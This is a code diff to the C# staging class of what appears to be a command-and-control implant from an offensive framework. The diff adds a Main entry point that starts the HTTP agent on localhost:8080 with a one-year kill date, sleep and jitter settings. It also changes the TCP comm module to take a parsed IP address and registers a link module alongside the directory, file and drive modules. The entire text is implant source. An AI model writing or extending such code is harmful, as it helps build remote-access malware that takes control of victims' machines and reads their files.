@@ -1,10 +1,16 @@
 ﻿ using Agent.Modules;
 
 using System;
+using System.Net;
 
 public class AgentStage
 {
     static string AgentID;
+
+    static void Main(string[] args)
+    {
+        HttpEntryPoint("HTTP", DateTime.UtcNow.AddDays(365), "127.0.0.1", 8080, 1, 0);
+    }
 
     public static void HttpEntryPoint(string agentID, DateTime killDate, string connectHost, int connectPort, int sleepInterval, int sleepJitter)
     {
@@ -27,7 +33,7 @@ public class AgentStage
         var config = new ConfigController();
         config.SetOption(ConfigSetting.KillDate, killDate);
 
-        var commModule = new TcpCommModule(bindAddress, bindPort);
+        var commModule = new TcpCommModule(IPAddress.Parse(bindAddress), bindPort);
 
         StartAgent(config, commModule);
     }
@@ -55,6 +61,7 @@ public class AgentStage
         
         agent.RegisterAgentModule(new CoreModule());
         agent.RegisterAgentModule(new SetModule());
+        agent.RegisterAgentModule(new LinkModule());
         agent.RegisterAgentModule(new DirectoryModule());
         agent.RegisterAgentModule(new FileModule());
         agent.RegisterAgentModule(new DrivesModule());
